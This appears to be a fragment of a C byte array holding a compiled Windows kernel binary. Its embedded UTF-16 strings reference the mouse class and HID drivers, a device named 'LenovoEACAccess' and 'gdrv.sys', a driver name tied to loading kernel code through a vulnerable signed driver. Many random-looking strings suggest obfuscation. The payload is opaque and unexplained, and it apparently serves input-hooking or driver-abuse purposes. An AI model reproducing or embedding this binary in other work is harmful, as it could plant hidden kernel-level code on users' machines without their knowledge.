	0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x1D, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x00, 0x48, 0x8D, 0x0D, 0x00,
	0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78,
	0x78, 0x78, 0x78, 0x3F, 0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78,
	0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00,
	0x72, 0x00, 0x5C, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x43, 0x00,
	0x6C, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00,
	0x72, 0x00, 0x5C, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x48, 0x00,
	0x49, 0x00, 0x44, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0x5C, 0x00, 0x44, 0x00,
	0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00,
	0x4C, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x6F, 0x00,
	0x45, 0x00, 0x41, 0x00, 0x43, 0x00, 0x41, 0x00, 0x63, 0x00, 0x63, 0x00,
	0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00,
	0x6F, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00,
	0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x4C, 0x00, 0x65, 0x00,
	0x6E, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x6F, 0x00, 0x45, 0x00, 0x41, 0x00,
	0x43, 0x00, 0x41, 0x00, 0x63, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00,
	0x73, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4C, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x6F, 0x00,
	0x45, 0x00, 0x41, 0x00, 0x43, 0x00, 0x41, 0x00, 0x63, 0x00, 0x63, 0x00,
	0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x67, 0x00, 0x64, 0x00,
	0x72, 0x00, 0x76, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00,
	0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x31, 0x6B, 0x30, 0x63, 0x31, 0x65, 0x68, 0x7A,
	0x51, 0x54, 0x48, 0x33, 0x71, 0x55, 0x71, 0x44, 0x44, 0x52, 0x6D, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x75, 0x21, 0x26, 0x2B, 0x2B, 0x56, 0x6A, 0x7D, 0x65, 0x3E, 0x38, 0x62,
	0x37, 0x64, 0x5E, 0x3B, 0x26, 0x57, 0x4E, 0x62, 0x7A, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x55, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x37, 0x6A, 0x78, 0x73, 0x58, 0x62, 0x49, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x47, 0x7A, 0x52, 0x53, 0x30, 0x5A, 0x6D, 0x4F,
	0x68, 0x43, 0x7A, 0x6F, 0x69, 0x56, 0x33, 0x38, 0x61, 0x73, 0x58, 0x73,
	0x71, 0x6D, 0x43, 0x49, 0x65, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x3E, 0x66, 0x65, 0x2E, 0x57, 0x29, 0x09, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6C, 0x4F, 0x30, 0x54, 0x53, 0x30, 0x75, 0x64,
	0x56, 0x39, 0x4A, 0x38, 0x6B, 0x42, 0x63, 0x54, 0x65, 0x59, 0x57, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x37, 0x5F, 0x77, 0x20, 0x20, 0x50, 0x29, 0x68, 0x39, 0x3D, 0x3C, 0x6A,
	0x40, 0x32, 0x00, 0xCC, 0x72, 0x7C, 0x63, 0x72, 0x26, 0x78, 0x57, 0x5F,
	0x76, 0x51, 0x36, 0x6E, 0x2C, 0x25, 0x49, 0x55, 0x3B, 0x6E, 0x6D, 0x2C,
	0x55, 0x63, 0x6E, 0x47, 0x5F, 0x43, 0x41, 0x31, 0x52, 0x62, 0x52, 0x00,
	0x69, 0x59, 0x66, 0x79, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x25, 0x3D, 0x44, 0x50, 0x62, 0x53, 0x44, 0x74,
	0x6D, 0x20, 0x4F, 0x76, 0x78, 0x20, 0x20, 0x00, 0x5A, 0x61, 0x32, 0x46,
	0x4F, 0x20, 0x65, 0x37, 0x46, 0x37, 0x48, 0x64, 0x71, 0x75, 0x42, 0x33,
	0x66, 0x36, 0x74, 0x45, 0x67, 0x36, 0x75, 0x56, 0x6F, 0x63, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6F, 0x78, 0x43, 0x75, 0x7A, 0x51, 0x34, 0x54,
	0x64, 0x6A, 0x54, 0x37, 0x35, 0x76, 0x69, 0x51, 0x6F, 0x37, 0x4D, 0x75,
	0x36, 0x58, 0x37, 0x46, 0x67, 0x39, 0x52, 0x41, 0x72, 0x33, 0x4B, 0x00,
	0x41, 0x35, 0x6C, 0x65, 0x76, 0x6B, 0x30, 0x38, 0x30, 0x6B, 0x55, 0x30,
	0x76, 0x53, 0x56, 0x62, 0x54, 0x61, 0x77, 0x62, 0x74, 0x73, 0x48, 0x44,
	0x6C, 0x6C, 0x53, 0x50, 0x61, 0x37, 0x7A, 0x51, 0x6D, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x5A, 0x76, 0x3E, 0x26, 0x26, 0x62, 0x54, 0x47, 0x5D, 0x56, 0x69, 0x44,
	0x74, 0x2A, 0x40, 0x3F, 0x33, 0x65, 0x4D, 0x51, 0x75, 0x67, 0x25, 0x5A,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x47, 0x47, 0x55, 0x42,
	0x60, 0x31, 0x49, 0x75, 0x5F, 0x79, 0x41, 0x4E, 0x49, 0x4C, 0x39, 0x33,
	0x5F, 0x3E, 0x5F, 0x7C, 0x23, 0x61, 0x30, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x64, 0x56, 0x51, 0x31, 0x53, 0x45, 0x66, 0x48,
	0x43, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x45, 0x5B, 0x78, 0x73,
	0x4C, 0x65, 0x42, 0x6B, 0x70, 0x51, 0x5F, 0x4F, 0x57, 0x42, 0x7C, 0x76,
	0x63, 0x40, 0x58, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x71, 0x35, 0x21, 0x44, 0x73, 0x5D, 0x5F, 0x39,
	0x5E, 0x68, 0x4C, 0x29, 0x3A, 0x37, 0x68, 0x5F, 0x55, 0x44, 0x71, 0x4A,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x38, 0x3B, 0x63, 0x53, 0x72, 0x72, 0x75, 0x2B, 0x4D, 0x75, 0x2E, 0x7C,
	0x43, 0x2E, 0x64, 0x7A, 0x45, 0x37, 0x69, 0x66, 0x5D, 0x76, 0x77, 0x34,
	0x6A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x69, 0x38, 0x29, 0x2D,
	0x54, 0x4D, 0x68, 0x31, 0x30, 0x78, 0x29, 0x20, 0x20, 0x20, 0x09, 0x26,
	0x29, 0x78, 0x6A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x68, 0x69, 0x76, 0x34, 0x6D, 0x35, 0x30, 0x42,
	0x68, 0x4E, 0x38, 0x51, 0x4C, 0x67, 0x44, 0x50, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x56, 0x74, 0x6F, 0x55, 0x26, 0x48, 0x4A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x77, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x3E, 0x4C, 0x55, 0x24,
	0x3E, 0x4A, 0x2D, 0x33, 0x73, 0x7E, 0x5F, 0x56, 0x00, 0xCC, 0xCC, 0xCC,
	0x48, 0x6E, 0x5F, 0x67, 0x77, 0x74, 0x33, 0x39, 0x46, 0x4D, 0x7E, 0x4E,
	0x37, 0x75, 0x56, 0x69, 0x44, 0x5B, 0x26, 0x61, 0x6A, 0x79, 0x5D, 0x63,
	0x5F, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4D, 0x71, 0x23, 0x28,
	0x25, 0x58, 0x56, 0x28, 0x29, 0x5A, 0x25, 0x4B, 0x77, 0x37, 0x5D, 0x5B,
	0x48, 0x4F, 0x6E, 0x59, 0x42, 0x39, 0x23, 0x62, 0x4E, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x00, 0xCC, 0x64, 0x72, 0x49, 0x7A, 0x7B, 0x7E, 0x4A, 0x26,
	0x23, 0x75, 0x3E, 0x49, 0x54, 0x60, 0x40, 0x00, 0x70, 0x2C, 0x2A, 0x63,
	0x35, 0x6D, 0x6E, 0x57, 0x58, 0x62, 0x7A, 0x4E, 0x38, 0x47, 0x34, 0x5A,
	0x66, 0x5D, 0x5E, 0x39, 0x2B, 0x43, 0x49, 0x50, 0x4D, 0x28, 0x6A, 0x67,
	0x7E, 0x76, 0x62, 0x42, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x09, 0x0A, 0x0A, 0x0A,
	0x09, 0x09, 0x20, 0x09, 0x20, 0x0D, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4D, 0x56, 0x75, 0x50, 0x34, 0x36, 0x61, 0x4C, 0x72, 0x37, 0x70, 0x4C,
	0x00, 0xCC, 0xCC, 0xCC, 0x20, 0x20, 0x20, 0x20, 0x5B, 0x42, 0x65, 0x38,
	0x5A, 0x6C, 0x2A, 0x36, 0x75, 0x3A, 0x55, 0x28, 0x7A, 0x55, 0x54, 0x6B,
	0x5F, 0x72, 0x63, 0x60, 0x47, 0x3F, 0x67, 0x3E, 0x44, 0x00, 0xCC, 0xCC,
	0x46, 0x57, 0x7D, 0x50, 0x72, 0x21, 0x7E, 0x3E, 0x2B, 0x7E, 0x4C, 0x51,
	0x6E, 0x71, 0x2E, 0x5F, 0x4D, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x75, 0x58, 0x5B, 0x28,
	0x2E, 0x35, 0x6F, 0x3E, 0x58, 0x38, 0x63, 0x3E, 0x24, 0x7E, 0x09, 0x00,
	0x56, 0x35, 0x54, 0x55, 0x73, 0x69, 0x71, 0x36, 0x38, 0x75, 0x37, 0x53,
	0x59, 0x33, 0x46, 0x59, 0x39, 0x39, 0x42, 0x46, 0x74, 0x4C, 0x47, 0x66,
	0x33, 0x33, 0x6C, 0x49, 0x45, 0x41, 0x6D, 0x55, 0x46, 0x45, 0x6E, 0x71,
	0x4E, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x37, 0x39, 0x71, 0x41, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x45, 0x54, 0x42, 0x3A, 0x74, 0x6F, 0x24, 0x54,
	0x45, 0x4E, 0x58, 0x36, 0x6B, 0x77, 0x2D, 0x6F, 0x25, 0x2C, 0x4C, 0x62,
	0x62, 0x29, 0x3B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x32, 0x79, 0x77, 0x44, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x5A, 0x77, 0x46, 0x48, 0x69, 0x20, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x20, 0x0A, 0x09, 0x0A,
	0x20, 0x0A, 0x0D, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x09, 0x09, 0x09,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x62, 0x5A, 0x78, 0x6A, 0x77, 0x47, 0x6E, 0x6D,
	0x44, 0x4A, 0x32, 0x70, 0x35, 0x33, 0x50, 0x30, 0x4B, 0x56, 0x4C, 0x42,
	0x4D, 0x4B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x20, 0x0A, 0x09, 0x09, 0x0A, 0x09, 0x0A, 0x0A, 0x20, 0x09, 0x20, 0x20,
	0x0A, 0x09, 0x0A, 0x20, 0x0A, 0x20, 0x20, 0x09, 0x20, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x09, 0x20, 0x0A, 0x09,
	0x0A, 0x20, 0x0A, 0x0A, 0x20, 0x0A, 0x0A, 0x0A, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x0A, 0x0A, 0x0A, 0x0A, 0x09, 0x09, 0x20, 0x20, 0x20, 0x09, 0x0A,
	0x0A, 0x0D, 0x0A, 0x0D, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5D, 0x4B, 0x37, 0x20,
	0x75, 0x47, 0x6F, 0x75, 0x59, 0x26, 0x68, 0x61, 0x2E, 0x7E, 0x4E, 0x68,
	0x79, 0x5F, 0x7D, 0x53, 0x67, 0x59, 0x62, 0x26, 0x46, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x4B, 0x34, 0x38, 0x7E, 0x2B, 0x70, 0x79,
	0x3C, 0x45, 0x5F, 0x64, 0x25, 0x46, 0x3B, 0x00, 0x46, 0x79, 0x4A, 0x70,
	0x76, 0x5A, 0x76, 0x35, 0x74, 0x38, 0x59, 0x42, 0x4A, 0x44, 0x53, 0x37,
	0x47, 0x75, 0x57, 0x78, 0x4B, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x32, 0x74, 0x4A, 0x59, 0x50, 0x58, 0x52, 0x4B,
	0x44, 0x5A, 0x79, 0x71, 0x65, 0x09, 0x00, 0xCC, 0x4F, 0x73, 0x64, 0x6C,
	0x4F, 0x44, 0x39, 0x30, 0x6D, 0x4D, 0x69, 0x43, 0x62, 0x57, 0x79, 0x43,
	0x43, 0x56, 0x4E, 0x33, 0x36, 0x4F, 0x42, 0x71, 0x37, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x20, 0x09, 0x20, 0x0A, 0x20, 0x0A, 0x20, 0x20,
	0x09, 0x20, 0x09, 0x0A, 0x20, 0x0A, 0x09, 0x20, 0x20, 0x20, 0x20, 0x0A,
	0x09, 0x0A, 0x20, 0x09, 0x0A, 0x0A, 0x0A, 0x0A, 0x20, 0x0A, 0x09, 0x20,
	0x0A, 0x0A, 0x0D, 0x0A, 0x20, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x20, 0x0A, 0x0D, 0x0A, 0x0A, 0x0D, 0x09, 0x20,
	0x20, 0x0A, 0x0A, 0x0A, 0x20, 0x0A, 0x09, 0x0A, 0x20, 0x20, 0x20, 0x0A,
	0x09, 0x0A, 0x0D, 0x20, 0x09, 0x20, 0x0A, 0x0A, 0x0A, 0x20, 0x20, 0x20,
	0x09, 0x09, 0x09, 0x09, 0x20, 0x09, 0x20, 0x20, 0x0A, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x57, 0x61, 0x59, 0x38, 0x31, 0x38, 0x36, 0x33,
	0x50, 0x45, 0x35, 0x61, 0x56, 0x35, 0x63, 0x55, 0x79, 0x44, 0x32, 0x53,
	0x4A, 0x30, 0x20, 0x20, 0x09, 0x6E, 0x41, 0x76, 0x51, 0x00, 0xCC, 0xCC,
	0x20, 0x20, 0x7A, 0x58, 0x57, 0x36, 0x64, 0x63, 0x6E, 0x35, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x34, 0x64, 0x4B, 0x79, 0x73, 0x34, 0x54, 0x6D,
	0x71, 0x50, 0x58, 0x49, 0x67, 0x6E, 0x4F, 0x54, 0x79, 0x69, 0x70, 0x57,
	0x54, 0x52, 0x35, 0x66, 0x51, 0x68, 0x36, 0x39, 0x00, 0xCC, 0xCC, 0xCC,
	0x0A, 0x0A, 0x0A, 0x0D, 0x0D, 0x0A, 0x09, 0x0A, 0x0A, 0x0D, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6E, 0x53, 0x47, 0x51, 0x75, 0x6E, 0x6B, 0x65,
	0x49, 0x66, 0x75, 0x42, 0x69, 0x33, 0x36, 0x4A, 0x57, 0x4A, 0x71, 0x44,
	0x4C, 0x67, 0x6C, 0x79, 0x70, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x49, 0x47, 0x73, 0x32, 0x49, 0x3C, 0x34, 0x5F, 0x6C, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x3F, 0x3C, 0x39, 0x60, 0x6E, 0x2D, 0x56, 0x7E,
	0x6E, 0x74, 0x57, 0x37, 0x71, 0x4F, 0x47, 0x45, 0x3C, 0x7E, 0x36, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x5A, 0x38, 0x4E, 0x59, 0x44, 0x31, 0x51, 0x30, 0x45, 0x45, 0x53, 0x71,
	0x61, 0x54, 0x51, 0x44, 0x51, 0x49, 0x6E, 0x6B, 0x44, 0x78, 0x50, 0x68,
	0x50, 0x6A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x60, 0x3B, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x70, 0x57, 0x78, 0x37, 0x5A, 0x46, 0x71, 0x4E, 0x6B, 0x56, 0x48, 0x32,
	0x34, 0x34, 0x51, 0x31, 0x76, 0x4F, 0x4B, 0x71, 0x59, 0x70, 0x41, 0x58,
	0x53, 0x57, 0x5A, 0x38, 0x00, 0xCC, 0xCC, 0xCC, 0x7B, 0x4F, 0x2A, 0x62,
	0x6E, 0x5B, 0x36, 0x62, 0x6F, 0x2C, 0x51, 0x34, 0x76, 0x2D, 0x53, 0x66,
	0x7D, 0x53, 0x30, 0x61, 0x28, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x43, 0x71, 0x4B, 0x5D, 0x5F, 0x44, 0x36, 0x3C,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x71, 0x49, 0x66, 0x63,
	0x58, 0x6A, 0x4B, 0x35, 0x56, 0x76, 0x4F, 0x79, 0x00, 0xCC, 0xCC, 0xCC,
	0x09, 0x61, 0x74, 0x67, 0x65, 0x53, 0x6F, 0x63, 0x4D, 0x38, 0x45, 0x42,
	0x62, 0x79, 0x42, 0x47, 0x70, 0x76, 0x4C, 0x66, 0x62, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x59, 0x70, 0x67, 0x67,
	0x61, 0x61, 0x6F, 0x46, 0x56, 0x74, 0x36, 0x77, 0x4A, 0x53, 0x4C, 0x58,
	0x61, 0x54, 0x4F, 0x57, 0x75, 0x73, 0x65, 0x43, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x52, 0x7E, 0x46, 0x4D, 0x7D, 0x71, 0x38, 0x58,
	0x46, 0x4C, 0x42, 0x25, 0x4E, 0x5B, 0x32, 0x77, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x2C, 0x4E, 0x43, 0x3C, 0x70, 0x3E, 0x58, 0x7D, 0x2D, 0x3B, 0x7C, 0x61,
	0x67, 0x6C, 0x46, 0x41, 0x2E, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x29, 0x6C, 0x5B, 0x28,
	0x47, 0x72, 0x70, 0x2A, 0x6E, 0x56, 0x6C, 0x40, 0x77, 0x43, 0x30, 0x34,
	0x69, 0x36, 0x78, 0x75, 0x2A, 0x2E, 0x6B, 0x71, 0x4A, 0x41, 0x48, 0x2B,
	0x3C, 0x6A, 0x64, 0x7C, 0x21, 0x5B, 0x66, 0x2B, 0x39, 0x43, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x32, 0x7C, 0x50, 0x5D,
	0x51, 0x50, 0x35, 0x7D, 0x4E, 0x3E, 0x3F, 0x6E, 0x36, 0x7D, 0x66, 0x58,
	0x68, 0x6E, 0x70, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x36, 0x71, 0x66, 0x31, 0x6C, 0x50, 0x38, 0x4D,
	0x6C, 0x4A, 0x56, 0x4C, 0x59, 0x78, 0x6F, 0x52, 0x42, 0x6C, 0x63, 0x70,
	0x76, 0x67, 0x70, 0x4A, 0x75, 0x35, 0x75, 0x55, 0x39, 0x62, 0x42, 0x47,
	0x30, 0x49, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x7A, 0x7E, 0x3A, 0x4C, 0x64, 0x30, 0x45, 0x76,
	0x6A, 0x35, 0x38, 0x5F, 0x31, 0x6C, 0x61, 0x00, 0x77, 0x47, 0x6A, 0x4C,
	0x76, 0x73, 0x38, 0x32, 0x4C, 0x6D, 0x35, 0x68, 0x6E, 0x32, 0x30, 0x33,
	0x6C, 0x5A, 0x53, 0x69, 0x48, 0x76, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x5D, 0x23, 0x21, 0x78, 0x60, 0x6A, 0x5F, 0x44,
	0x5A, 0x7B, 0x31, 0x66, 0x00, 0xCC, 0xCC, 0xCC, 0x5E, 0x7C, 0x56, 0x20,
	0x23, 0x5B, 0x4F, 0x4E, 0x33, 0x35, 0x39, 0x7D, 0x6E, 0x33, 0x46, 0x74,
	0x3D, 0x7E, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x54, 0x4B, 0x73, 0x70, 0x51, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x2B, 0x57, 0x26, 0x66,
	0x63, 0x38, 0x64, 0x7B, 0x32, 0x57, 0x52, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0x54, 0x41, 0x5E, 0x5E, 0x57, 0x55, 0x47, 0x48, 0x5E, 0x5A, 0x36, 0x70,
	0x32, 0x4C, 0x78, 0x74, 0x3F, 0x54, 0x36, 0x32, 0x3F, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x42, 0x38, 0x60, 0x23,
	0x35, 0x3B, 0x7E, 0x2A, 0x40, 0x32, 0x49, 0x3F, 0x23, 0x3D, 0x5B, 0x37,
	0x57, 0x33, 0x73, 0x31, 0x61, 0x73, 0x56, 0x65, 0x7A, 0x67, 0x31, 0x30,
	0x2A, 0x51, 0x63, 0x7D, 0x66, 0x58, 0x72, 0x2B, 0x00, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x46, 0x78, 0x6A, 0x58,
	0x67, 0x5A, 0x67, 0x64, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x7A, 0x35, 0x6A, 0x70, 0x66, 0x6B, 0x5A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x79, 0x39, 0x2A, 0x58, 0x25, 0x31, 0x3F, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x33, 0x4F, 0x6F, 0x6D,
	0x54, 0x4B, 0x37, 0x6D, 0x48, 0x75, 0x44, 0x58, 0x36, 0x73, 0x31, 0x53,
	0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x6B, 0x33, 0x72, 0x66, 0x61, 0x38, 0x4F, 0x67,
	0x47, 0x76, 0x62, 0x63, 0x70, 0x7A, 0x6D, 0x44, 0x6C, 0x30, 0x4A, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x21, 0x34, 0x74, 0x49, 0x2E, 0x68, 0x6D, 0x54, 0x39, 0x7C, 0x59, 0x42,
	0x7C, 0x4D, 0x48, 0x4E, 0x4F, 0x2B, 0x57, 0x4C, 0x60, 0x75, 0x61, 0x68,
	0x26, 0x66, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x58, 0x53, 0x6D, 0x42,
	0x4E, 0x4A, 0x73, 0x33, 0x56, 0x71, 0x73, 0x34, 0x66, 0x46, 0x67, 0x33,
	0x39, 0x37, 0x32, 0x71, 0x76, 0x58, 0x56, 0x77, 0x6F, 0x6B, 0x59, 0x68,
	0x77, 0x4F, 0x53, 0x61, 0x67, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
